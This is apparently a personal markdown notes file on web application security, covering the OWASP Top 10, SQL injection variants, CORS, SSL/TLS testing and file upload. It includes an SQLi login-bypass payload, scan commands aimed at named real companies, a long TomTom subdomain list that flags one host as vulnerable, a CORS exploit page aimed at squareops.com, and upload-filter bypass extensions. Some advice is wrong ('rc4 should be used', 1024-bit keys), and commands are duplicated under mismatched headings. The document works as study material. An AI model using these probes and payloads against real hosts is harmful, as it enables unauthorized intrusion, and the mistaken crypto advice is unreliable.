## OWASP TOP 10
- A01:2021-Broken Access Control 
- A02 Cryptographic Failures
- A03 Injection
- A04:2021-Insecure Design
- A05:2021-Security Misconfiguration 
- A06:2021-Vulnerable and Outdated Components
- A07:2021-Identification and Authentication Failures 
- A08:2021-Software and Data Integrity Failures 
- A09:2021-Security Logging and Monitoring Failures 
- A10:2021-Server-Side Request Forgery

## Top 10 Mobile Risks - Initial Release 2023
- M1: Improper Credential Usage
- M2: Inadequate Supply Chain Security
- M3: Insecure Authentication/Authorization
- M4: Insufficient Input/Output Validation
- M5: Insecure Communication
- M6: Inadequate Privacy Controls
- M7: Insufficient Binary Protections
- M8: Security Misconfiguration
- M9: Insecure Data Storage
- M10: Insufficient Cryptography


## Broken Access Control
- Allow unauthorized users to gain access to sensitive data or systems.
- This can happen when controls such as authentication and authorization are not properly implemented

**Types of Broken Access Control Vulnerabilities**
- Insecure direct object references
- Lack of restriction on URL parameters
- Security misconfiguration
- Mass assignment

**Broken Access Control Attacks**
- Brute Force Attacks
- Session Hijacking
- Man-in-the-Middle Attacks
- Replay Attacks
- Privilege Escalation Attacks


**Prevention**
- Implement least privilege
- MFA
- Network segmentation 

**Exploit**
- Path Traversal  

## SQL Injection
- Attacker manipulate SQL queries by injecting malicious input.
- Gain unauthorized access to database.

**Vulnerability Include**
- Data Breaches
- Denial of Service Attacks
- Server Takeover

**Prevent**
- Proper validate all user input.
- Use secure Database Configuration.

1. Classic SQL Injection (SQLi)
2. Blind SQL Injection
4. Time-Based Blind SQL Injection
5. Boolean-Based Blind SQL Injection
6. Out-of-Band SQL Injection
7. Union-Based SQL Injection
8. Second-Order SQL Injection
9. Time-Based Blind Second-Order SQL Injection
10. Content-Based Blind Second-Order SQL Injection
11. Error-Based SQL Injection
12. Function-Based SQL Injection
13. Stored Procedure Injection
14. Inferential SQL Injection:Also known as "blind SQL injection,"

**1. Classic SQL Injection (SQLi)**
- Attacker manipulates an application's SQL query by injecting malicious SQL code into user-provided input fields or parameters.
   
Suppose you have a web application with a login form that uses the following SQL query to check user credentials:
```
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```
- The application takes user inputs for username and password.
- An attacker enters the following as the username input: admin' OR '1'='1.
```
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '$password';
```
In this case, because '1'='1' always evaluates to true, the query returns all rows from the users table, effectively granting unauthorized access to the application as the admin user.

**2. Blind SQL injection**
- Blind SQL injection is a type of SQL injection attack that exploits vulnerabilities in web applications to steal data by asking the database a series of true or false questions 


**3. Boolean-Based Blind SQL Injection**
- Boolean-Based Blind SQL Injection an attacker injects malicious SQL code to determine if their injected condition is true or false.
- They do this by observing the application's behavior or responses, as the application typically does not directly display database error messages or query results to the user.

**Prevention**
- Avoid displaying detailed error messages to users
- Input Validation

**4. Time-Based Blind SQL Injection**
- Time-Based Blind SQL Injection is a type of SQL injection attack where an attacker injects malicious SQL code into a vulnerable web application, introducing time delays in the application's responses. The attacker then measures the time it takes for the application to respond.

**5. Out-of-Band SQL Injection**
- Out-of-Band SQL Injection is a type of SQL injection attack where an attacker exploits a vulnerability in a web application to inject malicious SQL code that triggers external communication with a server controlled by the attacker


**6. Union-Based SQL Injection**
- Combines the results of multiple SELECT statements to fetch data from multiple tables as a single result set.

**7. Second-Order SQL Injection**
- Second-Order SQL Injection is a type of SQL injection attack where the attacker injects malicious SQL code into a web application, and the application stores the injected code in a database. The attack is executed later when the application retrieves and uses the stored data, leading to SQL injection vulnerabilities.

**8. Time-Based Blind Second-Order SQL Injection**
- In this attack, the attacker injects malicious SQL code that introduces time delays when executed, even though the results of the injection are not immediately visible. The delayed execution occurs at a later point in time when the application processes the injected data.

**9. Content-Based Blind Second-Order SQL Injection**
- In this attack, the attacker injects malicious SQL code into a web application, and the application stores the injected data in its database without immediate execution. The execution of the injected code occurs at a later point in time when the application retrieves and displays the stored data.

**10. Error-Based SQL Injection**
- The attacker intentionally injects malicious SQL code that causes the application to generate error messages containing valuable information.






## Insecure direct object references
This type of vulnerability occurs when an application exposes a direct reference to an internal object, such as a file or database record. By manipulating the reference, an attacker can gain unauthorized access to the object.

**Vulnerabilities**
- Information discloser

**Prevention**
- Use complex identifiers, such as GUIDs or random numbers.
- Do not expose identifiers in URLs or parameters unless absolutely necessary.
- Implement access control to restrict access to objects.
- WAF


## Security Misconfiguration
Poorly configured servers, frameworks, and libraries can leads to expose of sensitive data or allow unauthorized access.

**Vulnerability Include**
- Data Breaches
- Denial of Service Attacks
- Unauthorized Access

**Prevention**
- Disable unnecessary features.
- Monitor your application.

## File Inclusion

**Impact of File Inclusion**
- Code execution on server
- Code execution on client side
- Dos attack
- Information Disclosure

**LFI [Local file inclusion]**
- LFI refers to the vulnerability that allows an attacker to trick a web application into including files on the server that are not intended to be accessible directly.  In this scenerio attacker injecting specially crafted input, such as directory traversal sequences or malicious file path references, into the vulnerable web application leading to a complete system compromise.
**Impact**
-The impacts of an exploited Local File Inclusion (LFI) vulnerability can include unauthorized access to sensitive data, server compromise, execution of arbitrary code, and potentially complete control over the affected system, leading to data breaches, service disruptions, and overall system compromise.
**Recommendation**
-ID assignation – save your file paths in a secure database and give an ID for every single one, this way users only get to see their ID without viewing or altering the path
- Whitelisting  – use verified and secured whitelist files and ignore everything else
- Use databases – don’t include files on a web server that can be compromised, use a database instead
- Better server instructions – make the server send download headers automatically instead of executing files in a specified directory

**CVSS=**AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
**Overall CVSS Score:** 7.5
**Impact:** High
**RFI [Remote file inclusion]**
- RFI stands for remote file inclusion, which means an attacker can include a file from a remote server and execute it on your server.

## Cross-Site Request Forgery
- Attacker tricks victim to perform action that they do not intend to perform.<br/><br/>
**Vulnerability Include:**
- Changing password.
- Delete Account.
- Transfer funds.<br/><br/>
**How to Prevent**
- Use Firewall.
- Use CSRF Token
- Proper Session Management:
  - Use secure session cookies
  - implement session timeouts, and regenerate session identifiers upon login or privilege changes.
- Validate Referrer Header:
  - Check the Referer header on incoming requests to verify that the request originated from a trusted source. While this is not foolproof (as the header can be spoofed), it adds an additional layer of security.
- Use Same-Site Cookies:
  - Set the "SameSite" attribute on cookies to "Strict" or "Lax" to mitigate CSRF attacks. This restricts how cookies are sent in cross-origin requests.
- Implement the "Origin" Header:
  - Utilize the "Origin" header to verify the origin of incoming requests. This header can help prevent cross-origin requests from being processed as valid.
 
## SSRF [Server Side Request Forgery]
- Allow attacker to make request to unintended location using server side application.<br/><br/>
  **Vulnerability Include:**
  - Unauthorized action
    
  **How to Prevent:**
  - Validate URL Request, Parameter of the request, Ip address of the server
  - Use Firewall.

## XXE [XML External Entity]
- XML injection is a type of security vulnerability that occurs when an attacker injects malicious XML content into an application's input fields. The goal is often to manipulate the XML structure or trigger parsing errors to exploit vulnerabilities in the application.
  **Vulnerability Include:**
  - denial-of-service
  - executing arbitrary code on the server 
    
  **How to Prevent:**
  - Validate all XML input
  - disable external entity expansion in XML parsers
 


## CRLF Injection
- CRLF injection is a web application security vulnerability where an attacker inserts special characters into input data. These characters can manipulate web server responses, potentially leading to various attacks, including HTTP response splitting, session fixation, or cross-site scripting (XSS).<br/>
**Vulnerability Include:**
  - session fixation
  - cross-site scripting (XSS)<br/>
  
**How to Prevent:**
Input Validation and Sanitization
Security Headers: Implement security headers like HTTP Strict Transport Security (HSTS) and Content Security Policy (CSP) to enhance the security of your web application.

## HTTP request smuggling
- HTTP request smuggling happens when an attacker creates special HTTP requests that confuse a web server.
- There are two ways that a web server can figure out where one request ends and the next one begins: through the "Transfer-Encoding" and "Content-Length" headers in the HTTP request.
- The trick is that the attacker sends a single request that contains both types of headers. Because different parts of the server might look at these headers differently, it can lead to confusion. This confusion can cause the server to mishandle the request.
- When this happens, it can create security problems, like letting the attacker see sensitive data or do things they shouldn't be able to do on the website.
**Vulnerability Include:**
 - cache poisoning
 - session fixation
 - unauthorized data access

## Host Header Attack
- This attack typically involves changing the Host header value to a malicious or unexpected domain.
**Vulnerability Include:**
  - Unauthorized Access
  - Session Fixation
  - Cache Poisoning
  - Cross-Site Scripting (XSS)
  - Information Disclosure
**How to Prevent:**
  - Proper input validation
  - server configuration
 
## SSTI (Server-Side Template Injection)
- SSTI is a security vulnerability that occurs when an attacker can inject malicious code into a server-side template engine.
- Attackers inject malicious template code, which is then executed by the server-side template engine.
**Vulnerability Include:**
  - data leaks
  - execute arbitrary code
  - remote code execution
  - website defacement
**How to Prevent:**
  - input validation 
  - secure configuration of template engines
 
## SSI    
- SSI vulnerabilities occur when web servers improperly handle Server-Side Includes, which are used to include content or execute specific actions on the server.

**Vulnerability Include:**
  - data leaks
  - remote code execution
  - website defacement
**How to Prevent:**
- proper server configuration
- input validation 
- Content Security Policy (CSP)

**Mostly SSI work on these web pages but it's limited to these**
- .stm
- .shtml
- .shtm
- /bin
- search
- input field
  
## CSTI
- CSTI vulnerabilities occur when these templating engines process untrusted user input without proper validation or escaping. This means that an attacker can inject malicious template code into input fields or URLs.

**Vulnerability Include:**
  - Cross-Site Scripting (XSS) attacks
  - data leakage
**How to Prevent:**
  - validate user input
  - Use built-in escaping

## SSL/TLS handshake
- The SSL/TLS handshake is a crucial part of securing online communications, such as HTTPS for web browsing and secure email transmission. It ensures that data transmitted between the client and server remains confidential, authenticates the server's identity, and protects against unauthorized access and tampering.


## Cryptography Vulnerabilities
**Testing for weak cryptography**
- Weak ssl/tls protocols, ciphers, keys, and insufficient transport layer protocol.
- Oracle padding
- Testing for sensitive information sent via encrypted channel

**Weak ssl/tls protocols, ciphers, keys, and insufficient transport layer protocol.**
- weak protocols must be disabled.
- ssl v2 is enabled then there is a vulnerabilities
- if reneogitation is posible then there is a vulnerability it should be disabled
- if rsa or dsa is key must be at least 1024 bits encryption
- key must be generated with proper entropy
- md5 should not be used
- rc4 should be used
- server should be protected from beast as well as crime attacks
  
**ssl service recognition by nmap**
```bash
nmap -sV --reason -PN -n --top-ports 100 www.hackersera.com
```

**checking for certificate information, weak cipher and sslv2 via nmap**
```bash
nmap -sV --reason -PN -n --top-ports 100 www.hackersera.com
```
```bash
nmap --script ssl-cert,ssl-enum-ciphers -p 443,465 www.hackersera.com
```

**checking for client-initiated renegotiation and secure renegotation via openssl**
```bash
nmap -sV --reason -PN -n --top-ports 100 www.hackersera.com
```
```bash
openssl s_client -connect www.hackersera.com:PORT
```
```bash
HEAD / HTTP/1.1
R
```

**Testing ssl/tls vulnerability with sslyze**
```bash
nmap -sV --reason -PN -n --top-ports 100 squareops.com
```
```bash
docker run -it sslyze squareops.com:443
```

**Poodle attack SSLV3**
- An attacker may be able to exploit mitm attacks and decrypt communication b/w server and client
- you can try on these ports ftp, imaps, pop3s
- **How to detect**
  - text file of subdomain of this website tomtom.com
```bash
prod-cambridge-proxy-vip.tomtom.com
beat.tomtom.com
msolearning.tomtom.com
media.tomtom.com
support.tomtom.com
home.tomtom.com
mapmaker.tomtom.com
active-preprod.tomtom.com
academy.tomtom.com
learn.tomtom.com
msr-gdpr.tomtom.com
vag-hcp3-nds-updates.tomtom.com
ahdugahvairo-pushfeeds.tomtom.com
melco-tpeg.tomtom.com
nds-updates-korea.tomtom.com
pre-trafficstats.tomtom.com
cde-korea-update.tomtom.com
safetycamupload.tomtom.com
developer-dh.tomtom.com
nds-updates-beta.tomtom.com
download-tls.tomtom.com
nds-updates-psa-ea2020.tomtom.com
cde-india-update.tomtom.com
vag-hcp3-nds-updates-korea.tomtom.com
nds-updates-beta-korea.tomtom.com
magicbehindthemap.tomtom.com
opensource.tomtom.com
mail5.tomtom.com
brandguide.tomtom.com
investors.tomtom.com
geocoder.tomtom.com
shop.tomtom.com
us.tomtom.com
pushfeed-receiver.tomtom.com
pushfeed-ssl-receiver.tomtom.com
preprod-vag-hcp3-nds-updates.tomtom.com
preprod-vag-hcp3-nds-updates-korea.tomtom.com
oauth-preprod.tomtom.com
mol.tomtom.com
dih.tomtom.com
dcas.tomtom.com
artifactory.tomtom.com
changespotting.tomtom.com
mobility.tomtom.com
rm.tomtom.com
rss.tomtom.com
acheter-gps.tomtom.com
trafficfree.tomtom.com
backoffice-curts.tomtom.com
engage.tomtom.com
licensing.tomtom.com
img10-abc.tomtom.com
post.tomtom.com
gone.tomtom.com
sports-preprod-origin.tomtom.com
engineering.tomtom.com
test-sfmc-message.tomtom.com
rightnow.tomtom.com
tomtomgo940.tomtom.com
amigo.tomtom.com
breakfree.tomtom.com
iphone.tomtom.com
more.tomtom.com
onboarder.tomtom.com
traces-preprod.tomtom.com
sports-prod-origin.tomtom.com
gms.tomtom.com
plan.tomtom.com
nds-updates.tomtom.com
roadcheck.tomtom.com
partnerlinkdr.tomtom.com
roadcheck-test.tomtom.com
roadcheck-dev.tomtom.com
www-preprod-origin.tomtom.com
bilston-pushfeed-receiver-vip.tomtom.com
roadcheck-acc.tomtom.com
kr-api.tomtom.com
test-nyproxy-public-vip.tomtom.com
eu-api.tomtom.com
id.tomtom.com
us-api.tomtom.com
prospect-ford-1-tts.tomtom.com
customization-tool.tomtom.com
solaris-cambridge-proxy-vip.tomtom.com
www-preprod.tomtom.com
www-tomtommaps-preprod-origin.tomtom.com
webmail.tomtom.com
meet.tomtom.com
dialin.tomtom.com
www-prod-origin.tomtom.com
download-ephemeris.tomtom.com
backoffice.tomtom.com
intershop-prod.tomtom.com
lbsplatform.tomtom.com
plus.tomtom.com
connect-test.tomtom.com
sfmc-message.tomtom.com
dev-sfmc-message.tomtom.com
demo.tomtom.com
ja.tomtom.com
prospect-audi-traffic.tomtom.com
plus-test.tomtom.com
mail3.tomtom.com
mail2.tomtom.com
starwars.tomtom.com
prioritydriving.tomtom.com
mapsby.tomtom.com
annualreport2014.tomtom.com
testgeocoder.tomtom.com
bo.tomtom.com
protect.tomtom.com
pnd-platform-gerrit.tomtom.com
appanalytics-dev.tomtom.com
training.tomtom.com
betaforum.tomtom.com
psa-ams-preprod.tomtom.com
office365.tomtom.com
lisbonna-cs.tomtom.com
bhumitra-apis.tomtom.com
repo.tomtom.com
cpp.tomtom.com
prospect-tsq.tomtom.com
audi-traffic.tomtom.com
audi-cn-1-motown2.tomtom.com
b2bqas.tomtom.com
trafficpro.tomtom.com
groups.tomtom.com
beta.tomtom.com
developer-gatsby-dev.tomtom.com
developer-gatsby-prod.tomtom.com
moma-os.tomtom.com
retail.tomtom.com
retailsandbox.tomtom.com
mail4.tomtom.com
autodiscover.tomtom.com
maps.tomtom.com
city.tomtom.com
ts.tomtom.com
qianpianyilv-pushfeeds.tomtom.com
panoramix.tomtom.com
filetransfer.tomtom.com
roadcheck-demo.tomtom.com
proxy.tomtom.com
livetraffic.tomtom.com
prod-perseus-worldwide-nissan-vip.tomtom.com
speedcams.tomtom.com
mapversiontracker.tomtom.com
developer-staging.tomtom.com
developer-dev.tomtom.com
cpp-core.tomtom.com
mit-preprod.tomtom.com
ams2-prod-perseus-audit-bmw-vip.tomtom.com
btsqas.tomtom.com
bts.tomtom.com
lyncdiscover.tomtom.com
lswebext03.tomtom.com
lswebconf.tomtom.com
lswacext02.tomtom.com
ms-cpp.tomtom.com
promotion.tomtom.com
cert-traffic.tomtom.com
connect-us.tomtom.com
nds.tomtom.com
ft.tomtom.com
conf.tomtom.com
aws.tomtom.com
dl.tomtom.com
od.tomtom.com
status.tomtom.com
sip.tomtom.com
lsaccess.tomtom.com
nissan-ams-preprod.tomtom.com
hyundai-ams-preprod.tomtom.com
route-monitoring.tomtom.com
status-001.tomtom.com
connect-au.tomtom.com
rer.tomtom.com
wireless.tomtom.com
workplace.tomtom.com
developer-hybrid.tomtom.com
email.tomtom.com
```

  ```bash
  nmap -sV --version-light -Pn --script ssl-poodle -p 443 -iL tomtom.txt   // this domain is vulnerable beat.tomtom.com
  ```
  ```bash
  nmap --script ssl-enum-ciphers -p 443 beat.tomtom.com
  ```
  ```bash
  curl -v3 -X HEAD https://beat.tomtom.com
  ```

## Blind XSS vs Stored XSS
- In Stored XSS, the attacker can inject malicious code into a web page that is then stored on the server and executed every time a user visits that page. 
- In Blind XSS, the attacker injects malicious code into a web page that is not immediately executed.

**Attack on**
- contact us
- feedback page
- ticket generation
- chat app
- log viewers
- any application that requires users interaction
- submit complaint


## HSTS
- HSTS is designed to ensure that web connections are made securely over HTTPS
```bash
curl -s -D- web url | grep -i Strict
```
```bash
hsecscan url 
```


## CORS
- Poorly Implemented, Best Case For Attack:
  <p>Access-Control-Allow-Origin: https://attacker.com</p>
  <p>Access-Control-Allow-Credentials:true</p>

- Poorly Implemented, Exploitable:
  <p>Access-Control-Allow-Origin: null</p>
  <p>Access-Control-Allow-Credentials:true</p>

- Poorly Implemented, Not Exploitable:
  <p>Access-Control-Allow-Origin: *</p>
  <p>Access-Control-Allow-Credentials:true</p>

<b>Insecure CORS through Request Header</b>
- Capture the request
- Spider the host
- Search <embed?> in url and send that url to Repeater.
- Add Origin: http://evil.com
<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/40b1e9d5-08cd-4dfd-b4f9-2f09b3916b6a" width="600" background-size="cover"/>
<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/c4b59631-7c26-45e2-8fa2-d141c2a9cf7e" width="600" background-size="cover"/>
<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/49264abd-f100-4369-b97a-ea8861f0f293" width="600" background-size="cover"/>



- How to check Insecure CORS
  ```
  curl https://squareops.com -H "Origin:http://hackersera.com" -I
  ```
<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/b38505f3-4793-4b14-8efa-a1b6d5d1dde8" width="600" background-size="cover"/>

```
<!DOCTYPE html>
<html>
<body>
<center>
<h2>CORS POC Exploit</h2>
<h3>Extract SID</h3>
<div id="demo">
<button type="button" onclick="cors()">Exploit</button>
</div>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET","https://squareops.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fsquareops.com", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```

<b>Description</b>
<p>- CORS (Cross-Origin Resource Sharing) is a web security mechanism that controls which origins are allowed to access resources on a different domain. In this scenerio Threat actors can exploit CORS misconfigurations by manipulate or intercept cross-origin requests for data integrity breaches, and compromise the security of web applications.</p>

<b>Impact</b>
<p>- Threat actors exploiting Cross-Origin Resource Sharing (CORS) may compromise user privacy and control, leading to data theft and unauthorized access and also enable cross-site scripting attacks, facilitating the injection of malicious scripts and potential data manipulation, resulting in data integrity breaches and damaging the organization's reputation.</p>
<b>Recommendation</b>
<p>
- Limit the Access-Control-Allow-Origin header to trusted sites, avoiding dynamic reflection of origins without proper validation.
- Avoid using 'null' in the Access-Control-Allow-Origin header and configure CORS headers carefully for both private and public servers.
- Refrain from utilizing wildcards in internal networks to prevent exposing internal resources to untrusted external domains.
</p>


# File Upload
<b>Content-type bypass</b>
<p>image/png</p>
<p>image/jpeg</p>
<p>image/gif</p>
<p>text/php</p>
application/octet-stream
SetHandler application/x-httpd-php
<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/b3123767-7516-4e31-b98f-f79c3328fc1a" width="600" background-size="cover"/>

<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/68e34397-fb6e-4f91-add5-2ba60c166e50" width="600" background-size="cover"/>

<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/fe773688-a79e-4d0d-9931-18d74d62ad65" width="600" background-size="cover"/>


<b>Suffix Blacklist bypass</b>
deny extension= '.asp','.aspx','.php','.jsp'
for example upload a file name "shell.php"
deny extension= '.asp','.aspx','.php','.jsp'

Now in this case capture the request and suffix like below:
<p>.php2</p>
<p>.php3</p>
<p>.php4</p>
<p>.php5</p>

<p>.pht</p>
<p>.phtm</p>
<p>.phtml</p>

<p>.php.gif</p>
<p>.jpg%00.php</p>

<p>.phps</p>
<p>.php.bak</p>
<p>.php.swp</p>
<p>.php~</p>
<p>.phps</p>
<p>.php.bak</p>
<p>.php.swp</p>
<p>.php~</p>
<p>.php.swo</p>
<p>.php.dist</p>
<p>.php_old</p>
<p>.php_orig</p>
<p>.php.copy</p>
<p>.php.back</p>
<p>.php.new</p>
<p>.php.save</p>


<b>File Parsing Rules Bypass</b>
$deny_ext = array(".php",".php5",".php4",".php3",".php2",".php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".ini");
        
<img src="https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/77fa5218-16af-4b20-b765-2d50d2606596" width="600" background-size="cover"/>
![image](https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/907ae47e-7543-4c82-b9d3-f0afe1e653e3)
![image](https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/3384d035-feea-42d0-ac6c-53aa636512f2)
![image](https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/2e5df0f1-5a19-4b3e-961f-5de4fddeed96)
![image](https://github.com/Krishna-Gopal-Pathak/CyberSecurity/assets/142927819/ac939feb-2da3-4f99-95dd-29de1bb44686)



  
